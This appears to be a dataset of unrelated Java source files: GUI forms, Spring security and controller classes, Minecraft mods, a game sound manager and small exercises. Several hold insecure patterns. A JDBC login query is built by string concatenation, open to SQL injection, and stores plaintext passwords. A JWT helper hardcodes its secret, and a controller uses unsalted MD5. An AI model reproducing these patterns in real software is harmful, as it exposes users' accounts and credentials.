    "package ordersystem;\r\nimport java.awt.Color;\r\nimport java.awt.EventQueue;\r\nimport java.awt.event.MouseAdapter;\r\nimport java.awt.event.MouseEvent;\r\nimport java.sql.Connection;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\n\r\nimport javax.swing.JFrame;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.JScrollPane;\r\nimport javax.swing.JSpinner;\r\nimport javax.swing.JTabbedPane;\r\nimport javax.swing.JTable;\r\nimport javax.swing.SpinnerNumberModel;\r\nimport javax.swing.border.EmptyBorder;\r\nimport javax.swing.table.DefaultTableModel;\r\nimport javax.swing.event.ChangeListener;\r\nimport javax.swing.event.ChangeEvent;\r\n\r\npublic class NewOrderForm extends JFrame {\r\n\r\n    private JPanel contentPane;\r\n    private JTable table;\r\n    private DatabaseConnection dbConnection;\r\n    private JPanel panel_1;\r\n    private JSpinner spinner_1;\r\n\r\n    public static void main(String[] args) {\r\n        EventQueue.invokeLater(new Runnable() {\r\n            public void run() {\r\n                try {\r\n                    NewOrderForm frame = new NewOrderForm();\r\n                    frame.setVisible(true);\r\n                } catch (Exception e) {\r\n                    e.printStackTrace();\r\n                }\r\n            }\r\n        });\r\n    }\r\n\r\n    public NewOrderForm() throws SQLException {\r\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n        setSize(1550, 820);\r\n        contentPane = new JPanel();\r\n        contentPane.setBackground(new Color(0, 0, 64));\r\n        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));\r\n\r\n        setContentPane(contentPane);\r\n        contentPane.setLayout(null);\r\n\r\n        JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);\r\n        tabbedPane.setBounds(103, 77, 804, 609);\r\n        contentPane.add(tabbedPane);\r\n\r\n        JPanel panel = new JPanel();\r\n        panel.setBackground(new Color(0, 64, 128));\r\n        tabbedPane.addTab(\"New tab\", null, panel, null);\r\n        panel.setLayout(null);\r\n\r\n        panel_1 = new JPanel();\r\n        panel_1.setBounds(26, 41, 225, 236);\r\n        panel.add(panel_1);\r\n        panel_1.setLayout(null);\r\n\r\n        spinner_1 = new JSpinner();\r\n        spinner_1.addChangeListener(new ChangeListener() {\r\n            @Override\r\n            public void stateChanged(ChangeEvent e) {\r\n                updateTotalPrice();\r\n            }\r\n        });\r\n        spinner_1.setBounds(79, 187, 30, 20);\r\n        panel_1.add(spinner_1);\r\n        \r\n\r\n        panel_1.addMouseListener(new MouseAdapter() {\r\n            @Override\r\n            public void mouseClicked(MouseEvent e) {\r\n                togglePanelColor();\r\n            }\r\n        });\r\n\r\n        JScrollPane scrollPane = new JScrollPane();\r\n        scrollPane.setBounds(938, 120, 404, 514);\r\n        contentPane.add(scrollPane);\r\n\r\n        table = new JTable();\r\n        scrollPane.setViewportView(table);\r\n        dbConnection = new DatabaseConnection();\r\n        updateTableModel();\r\n    }\r\n\r\n    private void togglePanelColor() {\r\n        Color originalColor = panel_1.getBackground();\r\n\r\n        if (originalColor.equals(Color.GREEN)) {\r\n            panel_1.setBackground(Color.RED);\r\n            removeFromDatabase(\"Product Name\"); // Replace with the actual product name\r\n            setSpinnerEnabled(false); // Disable the spinner when the panel turns red\r\n        } else {\r\n            panel_1.setBackground(Color.GREEN);\r\n            addToDatabase(\"Product Name\", 0, 0.0); // Pass default or other values\r\n            setSpinnerEnabled(true); // Enable the spinner when the panel turns green\r\n        }\r\n\r\n        updateTableModel();\r\n    }\r\n\r\n    private void setSpinnerEnabled(boolean enabled) {\r\n        spinner_1.setEnabled(enabled);\r\n    }\r\n\r\n    private void removeFromDatabase(String productName) {\r\n        try (Connection conn = dbConnection.getConnection()) {\r\n            String deleteQuery = \"DELETE FROM order3 WHERE product = ?\";\r\n\r\n            try (PreparedStatement pstmt = conn.prepareStatement(deleteQuery)) {\r\n                pstmt.setString(1, productName);\r\n                pstmt.executeUpdate();\r\n            }\r\n        } catch (SQLException ex) {\r\n            ex.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void addToDatabase(String productName, int quantity, double totalPrice) {\r\n        try (Connection conn = dbConnection.getConnection()) {\r\n            String updateQuery = \"INSERT INTO order3 (product, quantity, price) VALUES (?, ?, ?)\"\r\n                    + \" ON DUPLICATE KEY UPDATE quantity = VALUES(quantity), price = VALUES(price)\";\r\n\r\n            try (PreparedStatement pstmt = conn.prepareStatement(updateQuery)) {\r\n                pstmt.setString(1, productName);\r\n                pstmt.setInt(2, quantity);\r\n                pstmt.setDouble(3, totalPrice);\r\n                pstmt.executeUpdate();\r\n            }\r\n        } catch (SQLException ex) {\r\n            ex.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void updateTableModel() {\r\n        try (Connection con",
    "package com.example.ekart_backend.security;\n\nimport io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.security.Keys;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Component;\n\nimport javax.crypto.SecretKey;\nimport java.security.Key;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\n\n@Component\npublic class JwtTokenHelper{\n\n    private static final long JWT_TOKEN_VALIDITY = 5 * 60 * 60;\n    private static final String secretKey = \"deafdsadffvfsdafsgfasffdsaeardadsfds\";\n\n\n    public String getUsernameFromToken(String token){\n        return getClaimsFromToken(token, Claims::getSubject);\n    }\n\n    public Date getExpirationDateFromToken(String token){\n        return getClaimsFromToken(token, Claims::getExpiration);\n    }\n\n    public <T> T getClaimsFromToken(String token, Function<Claims, T> claimsResolver){\n        Claims claims = getAllClaimsFromToken(token);\n        return claimsResolver.apply(claims);\n    }\n\n    private Key getSigninKey(){\n        byte[] bytes = secretKey.getBytes();\n        return Keys.hmacShaKeyFor(bytes);\n    }\n\n    private Claims getAllClaimsFromToken(String token){\n        return Jwts.parser().verifyWith((SecretKey) getSigninKey())\n                .build()\n                .parseSignedClaims(token)\n                .getPayload();\n    }\n\n    private Boolean isExpired(String token){\n        final Date expiration = this.getExpirationDateFromToken(token);\n        return expiration.before(new Date());\n    }\n\n    public Boolean validateToken(String token, UserDetails userDetails){\n        final String username = userDetails.getUsername();\n        return username.equals(this.getUsernameFromToken(token)) && !isExpired(token);\n    }\n\n    public String generateToken(UserDetails userDetails){\n        Map<String, Object> claims = new HashMap<>();\n        return doGenerateToken(claims, userDetails.getUsername());\n    }\n\n    private String doGenerateToken(Map<String, Object> claims, String subject){\n        return Jwts.builder().claims(claims)\n                .subject(subject)\n                .issuedAt(new Date(System.currentTimeMillis()))\n                .expiration(new Date(System.currentTimeMillis() + JWT_TOKEN_VALIDITY * 1000))\n                .signWith(getSigninKey())\n                .compact();\n    }\n\n\n\n}\n",
    "package recursive;\r\n\r\npublic class LinearProbing {\r\n    private static final int TABLE_SIZE = 7;\r\n    private int[] table;\r\n\r\n    public LinearProbing() {\r\n        table = new int[TABLE_SIZE];\r\n        for (int i = 0; i < TABLE_SIZE; i++) {\r\n            table[i] = -1; \r\n        }\r\n    }\r\n\r\n    \r\n    private int hash(int key) {\r\n        return key % TABLE_SIZE;\r\n    }\r\n\r\n    \r\n    public void insert(int key) {\r\n        int index = hash(key);\r\n        int originalIndex = index;\r\n        do {\r\n            if (table[index] == -1) {\r\n                table[index] = key;\r\n                return;\r\n            }\r\n            index = (index + 1) % TABLE_SIZE; // Linear probing\r\n        } while (index != originalIndex); // Stop if we've checked all slots\r\n        System.out.println(\"Table is full. Cannot insert \" + key);\r\n    }\r\n\r\n    // Display the hash table\r\n    public void display() {\r\n        System.out.println(\"Hash Table:\");\r\n        System.out.println();\r\n        for (int i = 0; i < TABLE_SIZE; i++) {\r\n            System.out.println( i + \"  -->> \" + table[i]);\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        int[] numbers = {50, 700, 76, 85, 92, 73, 101};\r\n        LinearProbing linearProbing = new LinearProbing();\r\n\r\n        for (int num : numbers) {\r\n            linearProbing.insert(num);\r\n        }\r\n\r\n        linearProbing.display();\r\n    }\r\n}\r\n\r\n",
    "// Clase que representa a un cliente\npublic class Cliente {\n\n    // Atributos de la clase \"Cliente\"\n    private String nombre;    \n    private String Cedula;\n    private String fecha;\n    private Nivel_Ingresos nivel_ingresos;\n    private int ahorro; \n\n\n    // Constructor de la clase \"Cliente\" con par\u00e1metros\n    public Cliente(String nombre, String cedula, String fecha, Nivel_Ingresos nivel_ingresos, int ahorro) {\n        this.nombre = nombre;\n        this.Cedula = cedula;\n        this.fecha = fecha;\n        this.nivel_ingresos = nivel_ingresos;\n        this.ahorro = ahorro;\n    }\n\n    // Constructor de la clase Cliente sin par\u00e1metros\n    public Cliente() {\n    }\n\n    // M\u00e9todo getter para obtener el nombre del cliente\n    public String getNombre() {\n        return nombre;\n    }\n\n    // M\u00e9todo setter para establecer el nombre del cliente\n    public void setNombre(String nombre) {\n        this.nombre = nombre;\n    }\n\n    // M\u00e9todo getter para obtener la c\u00e9dula del cliente\n    public String getCedula() {\n        return Cedula;\n    }\n\n    // M\u00e9todo setter para establecer la c\u00e9dula del cliente\n    public void setCedula(String cedula) {\n        Cedula = cedula;\n    }\n\n    // M\u00e9todo getter para obtener la fecha de incorporaci\u00f3n del cliente\n    public String getFecha() {\n        return fecha;\n    }\n\n    // M\u00e9todo setter para establecer la fecha de incorporaci\u00f3n del cliente\n    public void setFecha(String fecha) {\n        this.fecha = fecha;\n    }\n\n    // M\u00e9todo getter para obtener el nivel de ingresos del cliente\n    public Nivel_Ingresos getNivel_ingresos() {\n        return nivel_ingresos;\n    }\n\n    // M\u00e9todo setter para establecer el nivel de ingresos del cliente\n    public void setNivel_ingresos(Nivel_Ingresos nivel_ingresos) {\n        this.nivel_ingresos = nivel_ingresos;\n    }\n\n    // M\u00e9todo getter para obtener el ahorro del cliente\n    public int getAhorro() {\n        return ahorro;\n    }\n\n    // M\u00e9todo setter para establecer el ahorro del cliente\n    public void setAhorro(int ahorro) {\n        this.ahorro = ahorro;\n    }\n}\n\n",
    "package com.wkrzywiec.medium.kanban.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport springfox.documentation.builders.PathSelectors;\nimport springfox.documentation.builders.RequestHandlerSelectors;\nimport springfox.documentation.service.ApiInfo;\nimport springfox.documentation.service.Contact;\nimport springfox.documentation.spi.DocumentationType;\nimport springfox.documentation.spring.web.plugins.Docket;\nimport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\nimport java.util.Collections;\n\n@Configuration\n@EnableSwagger2\npublic class SwaggerConfig {\n\n    @Bean\n    public Docket api() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .select()\n                .apis(RequestHandlerSelectors.any())\n                .paths(PathSelectors.any())\n                .build()\n                .apiInfo(getApiInfo());\n    }\n\n    private ApiInfo getApiInfo() {\n        return new ApiInfo(\n                \"Kanban REST API\",\n                \"This is a REST API of Kanban REST API, where you can get/add/remove/modify Kanban board and its task.\",\n                \"v1\",\n                \"Terms of service\",\n                new Contact(\"Wojtek Krzywiec\", \"www.github.com/wkrzywiec\", \"\"),\n                \"License of API\", \"API license URL\", Collections.emptyList()\n        );\n    }\n}\n",
    "package net.minecraft.client.renderer.entity.layers;\n\nimport com.mojang.blaze3d.matrix.MatrixStack;\nimport com.mojang.blaze3d.vertex.IVertexBuilder;\nimport net.minecraft.client.renderer.IRenderTypeBuffer;\nimport net.minecraft.client.renderer.RenderType;\nimport net.minecraft.client.renderer.entity.IEntityRenderer;\nimport net.minecraft.client.renderer.entity.model.HorseModel;\nimport net.minecraft.client.renderer.texture.OverlayTexture;\nimport net.minecraft.entity.passive.horse.HorseEntity;\nimport net.minecraft.item.DyeableHorseArmorItem;\nimport net.minecraft.item.HorseArmorItem;\nimport net.minecraft.item.ItemStack;\n\npublic class LeatherHorseArmorLayer extends LayerRenderer<HorseEntity, HorseModel<HorseEntity>>\n{\n    private final HorseModel<HorseEntity> field_215341_a = new HorseModel<>(0.1F);\n\n    public LeatherHorseArmorLayer(IEntityRenderer<HorseEntity, HorseModel<HorseEntity>> p_i50937_1_)\n    {\n        super(p_i50937_1_);\n    }\n\n    public void render(MatrixStack matrixStackIn, IRenderTypeBuffer bufferIn, int packedLightIn, HorseEntity LivingEntityIn, float limbSwing, float limbSwingAmount, float partialTicks, float ageInTicks, float netHeadYaw, float headPitch)\n    {\n        ItemStack itemstack = LivingEntityIn.func_213803_dV();\n\n        if (itemstack.getItem() instanceof HorseArmorItem)\n        {\n            HorseArmorItem horsearmoritem = (HorseArmorItem)itemstack.getItem();\n            this.getEntityModel().copyModelAttributesTo(this.field_215341_a);\n            this.field_215341_a.setLivingAnimations(LivingEntityIn, limbSwing, limbSwingAmount, partialTicks);\n            this.field_215341_a.setRotationAngles(LivingEntityIn, limbSwing, limbSwingAmount, ageInTicks, netHeadYaw, headPitch);\n            float f;\n            float f1;\n            float f2;\n\n            if (horsearmoritem instanceof DyeableHorseArmorItem)\n            {\n                int i = ((DyeableHorseArmorItem)horsearmoritem).getColor(itemstack);\n                f = (float)(i >> 16 & 255) / 255.0F;\n                f1 = (float)(i >> 8 & 255) / 255.0F;\n                f2 = (float)(i & 255) / 255.0F;\n            }\n            else\n            {\n                f = 1.0F;\n                f1 = 1.0F;\n                f2 = 1.0F;\n            }\n\n            IVertexBuilder ivertexbuilder = bufferIn.getBuffer(RenderType.getEntityCutoutNoCull(horsearmoritem.getArmorTexture()));\n            this.field_215341_a.render(matrixStackIn, ivertexbuilder, packedLightIn, OverlayTexture.NO_OVERLAY, f, f1, f2, 1.0F);\n        }\n    }\n}\n",
    "package manager;\n\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.Clip;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\n\npublic class SoundManager {\n\n    private Clip background;\n    private long clipTime = 0;\n\n    public SoundManager() {\n        background = getClip(loadAudio(\"background\"));\n    }\n\n    private AudioInputStream loadAudio(String url) {\n        try {\n            InputStream audioSrc = getClass().getResourceAsStream(\"/media/audio/\" + url + \".wav\");\n            InputStream bufferedIn = new BufferedInputStream(audioSrc);\n            return AudioSystem.getAudioInputStream(bufferedIn);\n\n        } catch (Exception e) {\n            System.err.println(e.getMessage());\n        }\n\n        return null;\n    }\n\n    private Clip getClip(AudioInputStream stream) {\n        try {\n            Clip clip = AudioSystem.getClip();\n            clip.open(stream);\n            return clip;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return null;\n    }\n\n    public void resumeBackground(){\n        background.setMicrosecondPosition(clipTime);\n        background.start();\n    }\n\n    public void pauseBackground(){\n        clipTime = background.getMicrosecondPosition();\n        background.stop();\n    }\n\n    public void restartBackground() {\n        clipTime = 0;\n        resumeBackground();\n    }\n\n    public void playJump() {\n        Clip clip = getClip(loadAudio(\"jump\"));\n        clip.start();\n\n    }\n\n    public void playCoin() {\n        Clip clip = getClip(loadAudio(\"coin\"));\n        clip.start();\n\n    }\n\n    public void playFireball() {\n        Clip clip = getClip(loadAudio(\"fireball\"));\n        clip.start();\n\n    }\n\n    public void playGameOver() {\n        Clip clip = getClip(loadAudio(\"gameOver\"));\n        clip.start();\n\n    }\n\n    public void playStomp() {\n        Clip clip = getClip(loadAudio(\"stomp\"));\n        clip.start();\n\n    }\n\n    public void playOneUp() {\n        Clip clip = getClip(loadAudio(\"oneUp\"));\n        clip.start();\n\n    }\n\n    public void playSuperMushroom() {\n\n        Clip clip = getClip(loadAudio(\"superMushroom\"));\n        clip.start();\n\n    }\n\n    public void playMarioDies() {\n\n        Clip clip = getClip(loadAudio(\"marioDies\"));\n        clip.start();\n\n    }\n\n    public void playFireFlower() {\n\n    }\n}\n",
    "package database;\r\n\r\nimport java.sql.*;\r\n\r\npublic class JDBC {\r\n\r\n    private static final String DB_URL = \"jdbc:mysql://your-database-url:3306/your-database-name\";\r\n    private static final String DB_USERNAME = \"your-username\";\r\n    private static final String DB_PASSWORD = \"your-password\";\r\n\r\n    public static boolean verifyUsername(String username){\r\n        try{\r\n            Connection connect = DriverManager.getConnection(\r\n                    DB_URL, DB_USERNAME, DB_PASSWORD\r\n            );\r\n\r\n            PreparedStatement verifyUsernameQuery = connect.prepareStatement(\"SELECT * FROM USERS WHERE USERNAME = ?\");\r\n            verifyUsernameQuery.setString(1, username);\r\n\r\n            ResultSet resultSet = verifyUsernameQuery.executeQuery();\r\n            // true - resultSet found the username in the database. So the username is duplicate\r\n            // false - username is not duplicate\r\n            if(resultSet.next())\r\n                return false;\r\n            else\r\n                return true;\r\n        } catch(Exception e){\r\n            e.printStackTrace();\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    public static boolean verifyUserLogIn(String username, String password){\r\n        try{\r\n            Connection connect = DriverManager.getConnection(\r\n                    DB_URL, DB_USERNAME, DB_PASSWORD\r\n            );\r\n\r\n            PreparedStatement verifyUsernameQuery = connect.prepareStatement(\r\n                    \"SELECT * FROM users WHERE USERNAME = '\" + username + \"' AND PASSWORD = '\" + password + \"'\");\r\n\r\n            ResultSet resultSet = verifyUsernameQuery.executeQuery();\r\n            if(resultSet.next())\r\n                return true;\r\n            else\r\n                return false;\r\n        } catch(Exception e){\r\n            e.printStackTrace();\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    public static boolean insertUserSignUp(String username, String password){\r\n        try{\r\n            Connection connect = DriverManager.getConnection(\r\n                    DB_URL, DB_USERNAME, DB_PASSWORD\r\n            );\r\n\r\n            PreparedStatement numberOfUsersQuery = connect.prepareStatement(\r\n                    \"SELECT COUNT(*) FROM USERS\");\r\n            ResultSet numOfUsersSet = numberOfUsersQuery.executeQuery();\r\n            numOfUsersSet.next();\r\n            int numOfUsers = numOfUsersSet.getInt(1);\r\n\r\n            PreparedStatement verifyUsernameQuery = connect.prepareStatement(\r\n                    \"INSERT INTO USERS(USER_ID, USERNAME, PASSWORD) \" +\r\n                            \"VALUES(?,?,?)\", Statement.RETURN_GENERATED_KEYS);\r\n            verifyUsernameQuery.setInt(1, numOfUsers + 1);\r\n            verifyUsernameQuery.setString(2, username);\r\n            verifyUsernameQuery.setString(3, password);\r\n            verifyUsernameQuery.executeUpdate();\r\n\r\n            ResultSet resultSet = verifyUsernameQuery.getGeneratedKeys();\r\n            if(resultSet.next()){\r\n                return true;\r\n            } return false;\r\n\r\n        } catch(Exception e){\r\n            e.printStackTrace();\r\n        }\r\n\r\n        return false;\r\n    }\r\n}\r\n",
    "package com.example.myapplication;\n\nimport android.util.Log;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport okhttp3.Call;\nimport okhttp3.Callback;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\npublic class ApiManager {\n    private static final String API_URL = \"https://localhost:8080/api/strings\";\n\n    private OkHttpClient client;\n    private List<String> strings;\n\n    public ApiManager() {\n        client = new OkHttpClient();\n    }\n\n    public void fetchDataFromApi(final CallbackListener callbackListener) {\n        Request request = new Request.Builder()\n                .url(API_URL)\n                .build();\n\n        client.newCall(request).enqueue(new Callback() {\n            @Override\n            public void onResponse(Call call, Response response) throws IOException {\n                if (response.isSuccessful() && response.body() != null) {\n                    String responseData = response.body().string();\n                    processData(responseData);\n                    callbackListener.onSuccess(strings);\n                } else {\n                    Log.e(\"ApiManager\", \"Failed to get data from API.\");\n                    callbackListener.onFailure(\"Failed to get data from API.\");\n                }\n            }\n\n            @Override\n            public void onFailure(Call call, IOException e) {\n                Log.e(\"ApiManager\", \"Failed to connect to API.\", e);\n                callbackListener.onFailure(\"Failed to connect to API.\");\n            }\n        });\n    }\n\n    private void processData(String responseData) {\n\n        try {\n            JSONObject jsonObject = new JSONObject(responseData);\n            JSONArray jsonArray = jsonObject.getJSONArray(\"strings\");\n\n\n            strings = new ArrayList<>();\n            for (int i = 0; i < jsonArray.length(); i++) {\n                strings.add(jsonArray.getString(i));\n            }\n\n        } catch (JSONException e) {\n            Log.e(\"ApiManager\", \"Failed to parse JSON response.\", e);\n        }\n    }\n\n    public interface CallbackListener {\n        void onSuccess(List<String> strings);\n        void onFailure(String errorMessage);\n    }\n}\n",
    "package net.devdyna.decor.common.register.block;\n\nimport net.devdyna.decor.Decor;\nimport net.devdyna.decor.common.register.item.DecorItem;\nimport net.minecraft.world.item.BlockItem;\nimport net.minecraft.world.item.Item;\nimport net.minecraft.world.level.block.Block;\nimport net.minecraft.world.level.block.Blocks;\nimport net.minecraft.world.level.block.SoundType;\nimport net.minecraft.world.level.block.state.BlockBehaviour;\nimport net.minecraftforge.eventbus.api.IEventBus;\nimport net.minecraftforge.registries.DeferredRegister;\nimport net.minecraftforge.registries.ForgeRegistries;\nimport net.minecraftforge.registries.RegistryObject;\n\nimport java.util.function.Supplier;\n\npublic class DecorBlock {\n    public static final DeferredRegister<Block> BLOCKS =\n            DeferredRegister.create(ForgeRegistries.BLOCKS, Decor.MOD_ID);\n\n    public static final RegistryObject<Block> RAINBOW = registerBlock(\"rainbow\",\n            () -> new Block(BlockBehaviour.Properties.copy(Blocks.IRON_BLOCK).sound(SoundType.WOOL)));\n\n\n    private static <T extends Block> RegistryObject<T> registerBlock(String name, Supplier<T> block) {\n        RegistryObject<T> toReturn = BLOCKS.register(name, block);\n        registerBlockItem(name, toReturn);\n        return toReturn;\n    }\n\n    private static <T extends Block> RegistryObject<Item> registerBlockItem(String name, RegistryObject<T> block) {\n        return DecorItem.ITEMS.register(name, () -> new BlockItem(block.get(), new Item.Properties()));\n    }\n\n    public static void register(IEventBus eventBus) {\n        BLOCKS.register(eventBus);\n    }\n}\n",
    "package com.campusdual.classroom;\n\npublic abstract class Merchandise {\n\n\tprotected String name;\n\tprotected String uniqueId;\n\tprotected String responsibleId;\n\tprotected int zone;\n\tprotected String area;\n\tprotected String shelf;\n\tprotected int quantity;\n\n\tpublic Merchandise(String name, String uniqueId, String responsibleId) {\n\t\tthis.name = name;\n\t\tthis.uniqueId = uniqueId;\n\t\tthis.responsibleId = responsibleId;\n\t}\n\n\tpublic Merchandise(String name, String uniqueId, String responsibleId, int zone, String area, String shelf,\n\t\t\tint quantity) {\n\t\tthis.name = name;\n\t\tthis.uniqueId = uniqueId;\n\t\tthis.responsibleId = responsibleId;\n\t\tthis.zone = zone;\n\t\tthis.area = area;\n\t\tthis.shelf = shelf;\n\t\tthis.quantity = quantity;\n\t}\n\n\tpublic String getLocation() {\n\t\tStringBuilder builder = new StringBuilder();\n\t\tbuilder.append(\"Z - \");\n\t\tbuilder.append(getZone());\n\t\tbuilder.append(\" A - \");\n\t\tbuilder.append(getArea());\n\t\tbuilder.append(\" E - \");\n\t\tbuilder.append(getShelf());\n\t\treturn builder.toString();\n\t}\n\n\tpublic abstract Object getSpecificData();\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic String getUniqueId() {\n\t\treturn uniqueId;\n\t}\n\n\tpublic void setUniqueId(String uniqueId) {\n\t\tthis.uniqueId = uniqueId;\n\t}\n\n\tpublic String getResponsibleId() {\n\t\treturn responsibleId;\n\t}\n\n\tpublic void setResponsibleId(String responsibleId) {\n\t\tthis.responsibleId = responsibleId;\n\t}\n\n\tpublic int getZone() {\n\t\treturn zone;\n\t}\n\n\tpublic void setZone(int zone) {\n\t\tthis.zone = zone;\n\t}\n\n\tpublic String getArea() {\n\t\treturn area;\n\t}\n\n\tpublic void setArea(String area) {\n\t\tthis.area = area;\n\t}\n\n\tpublic String getShelf() {\n\t\treturn shelf;\n\t}\n\n\tpublic void setShelf(String shelf) {\n\t\tthis.shelf = shelf;\n\t}\n\n\tpublic int getQuantity() {\n\t\treturn quantity;\n\t}\n\n\tpublic void setQuantity(int quantity) {\n\t\tthis.quantity = quantity;\n\t}\n}\n",
    "package dev.xxawesqmexx.player_metadata.utils;\r\n\r\nimport org.bukkit.configuration.file.FileConfiguration;\r\nimport org.bukkit.configuration.file.YamlConfiguration;\r\nimport org.bukkit.entity.Player;\r\nimport org.bukkit.event.EventHandler;\r\nimport org.bukkit.event.Listener;\r\nimport org.bukkit.event.player.PlayerQuitEvent;\r\nimport org.bukkit.plugin.java.JavaPlugin;\r\n\r\nimport java.io.File;\r\nimport java.util.UUID;\r\n\r\npublic class Player_MetaData implements Listener {\r\n\r\n    private static JavaPlugin plugin;\r\n\r\n    public static void initialize(JavaPlugin plugin) {\r\n        Player_MetaData.plugin = plugin;\r\n        plugin.getServer().getPluginManager().registerEvents(new Player_MetaData(), plugin);\r\n    }\r\n\r\n    @EventHandler\r\n    public void onPlayerQuit(PlayerQuitEvent event) {\r\n        Player player = event.getPlayer();\r\n        UUID playerUUID = player.getUniqueId();\r\n        File playerFile = new File(plugin.getDataFolder(), \"player_data\" + File.separator + playerUUID + File.separator + \"metadata.yml\");\r\n\r\n        if (playerFile.exists()) {\r\n            boolean deleted = playerFile.delete();\r\n            if (deleted) {\r\n                plugin.getLogger().info(\"Deleted metadata file for player \" + player.getName());\r\n            } else {\r\n                plugin.getLogger().warning(\"Failed to delete metadata file for player \" + player.getName());\r\n            }\r\n        }\r\n    }\r\n\r\n    public static void setMetaDataTag(Player player, String tag, Object value) {\r\n        plugin.getServer().getScheduler().runTask(plugin, () -> {\r\n            UUID playerUUID = player.getUniqueId();\r\n            File playerFile = new File(new File(plugin.getDataFolder(), \"player_data\"), playerUUID + File.separator + \"metadata.yml\");\r\n            FileConfiguration playerData = YamlConfiguration.loadConfiguration(playerFile);\r\n            playerData.set(tag, value);\r\n            try {\r\n                playerData.save(playerFile);\r\n            } catch (Exception e) {\r\n                e.printStackTrace();\r\n            }\r\n        });\r\n    }\r\n\r\n    public static void deleteMetaDataTag(Player player, String tag) {\r\n        plugin.getServer().getScheduler().runTask(plugin, () -> {\r\n            UUID playerUUID = player.getUniqueId();\r\n            File playerFile = new File(new File(plugin.getDataFolder(), \"player_data\"), playerUUID + File.separator + \"metadata.yml\");\r\n            FileConfiguration playerData = YamlConfiguration.loadConfiguration(playerFile);\r\n            if (playerData.contains(tag)) {\r\n                playerData.set(tag, null);\r\n                try {\r\n                    playerData.save(playerFile);\r\n                } catch (Exception e) {\r\n                    e.printStackTrace();\r\n                }\r\n            } else {\r\n                System.out.println(\"Tag \" + tag + \" does not exist in the player's metadata.\");\r\n            }\r\n        });\r\n    }\r\n\r\n    public static boolean isMetaDataTagSet(Player player, String tag) {\r\n        UUID playerUUID = player.getUniqueId();\r\n        File playerFile = new File(new File(plugin.getDataFolder(), \"player_data\"), playerUUID + File.separator + \"metadata.yml\");\r\n        FileConfiguration playerData = YamlConfiguration.loadConfiguration(playerFile);\r\n        return playerData.contains(tag);\r\n    }\r\n\r\n    public static Object getMetaDataTag(Player player, String tag) {\r\n        UUID playerUUID = player.getUniqueId();\r\n        File playerFile = new File(new File(plugin.getDataFolder(), \"player_data\"), playerUUID + File.separator + \"metadata.yml\");\r\n        FileConfiguration playerData = YamlConfiguration.loadConfiguration(playerFile);\r\n        if (playerData.contains(tag)) {\r\n            return playerData.get(tag);\r\n        } else {\r\n            return null;\r\n        }\r\n    }\r\n}",
    "package com.itheima.controller;\n\nimport com.itheima.pojo.Result;\nimport com.itheima.pojo.User;\nimport com.itheima.service.UserService;\nimport com.itheima.utils.JwtUtil;\nimport com.itheima.utils.Md5Util;\nimport com.itheima.utils.ThreadLocalUtil;\nimport jakarta.validation.constraints.Pattern;\nimport org.hibernate.validator.constraints.URL;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.util.StringUtils;\nimport org.springframework.validation.annotation.Validated;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@RestController\n@RequestMapping(\"/user\")\n@Validated\npublic class UserController {\n    @Autowired\n    private UserService userService;\n    @PostMapping(\"/register\")\n    public Result register(@Pattern(regexp = \"^\\\\S{5,16}$\") String username,@Pattern(regexp = \"^\\\\S{5,16}$\")String password){\n//        \u67e5\u8a62\u7528\u6236\n        User u = userService.finByUserName(username);\n        if(u == null){\n//            \u6c92\u6709\u5360\u7528\n//              \u8a3b\u518a\n            userService.register(username,password);\n            return Result.success();\n        }else{\n//            \u5360\u7528\n            return Result.error(\"\u7528\u6236\u540d\u5df2\u88ab\u5360\u7528\");\n        }\n    }\n    @PostMapping(\"/login\")\n    public Result<String> login(@Pattern(regexp = \"^\\\\S{5,16}$\") String username,@Pattern(regexp = \"^\\\\S{5,16}$\")String password){\n//        \u67e5\u8a62\u7528\u6236\n        User loginUser = userService.finByUserName(username);\n//        \u5224\u65b7\u7528\u6236\u662f\u5426\u5b58\u5728\n        if(loginUser == null){\n            return Result.error(\"\u7528\u6236\u540d\u932f\u8aa4\");\n\n        }\n//        \u5224\u65b7\u5bc6\u78bc\u662f\u5426\u6b63\u78ba\n        if(Md5Util.getMD5String(password).equals(loginUser.getPassword())){\n//            \u767b\u5165\u6210\u529f\n            Map<String,Object> claims = new HashMap<>();\n            claims.put(\"id\",loginUser.getId());\n            claims.put(\"username\",loginUser.getUsername());\n            String token = JwtUtil.genToken(claims);\n            return Result.success(token);\n        }\n\n        return Result.error(\"\u5bc6\u78bc\u932f\u8aa4\");\n\n    }\n\n    @GetMapping(\"/userInfo\")\n    public Result<User> userInfo(/*@RequestHeader(name = \"Authorization\") String token*/){\n//        \u6839\u64da\u7528\u6236\u540d\u67e5\u8a62\u7528\u6236\n//        Map<String, Object> map = JwtUtil.parseToken(token);\n        Map<String, Object> map = ThreadLocalUtil.get();\n        String username = (String) map.get(\"username\");\n        User user = userService.finByUserName(username);\n        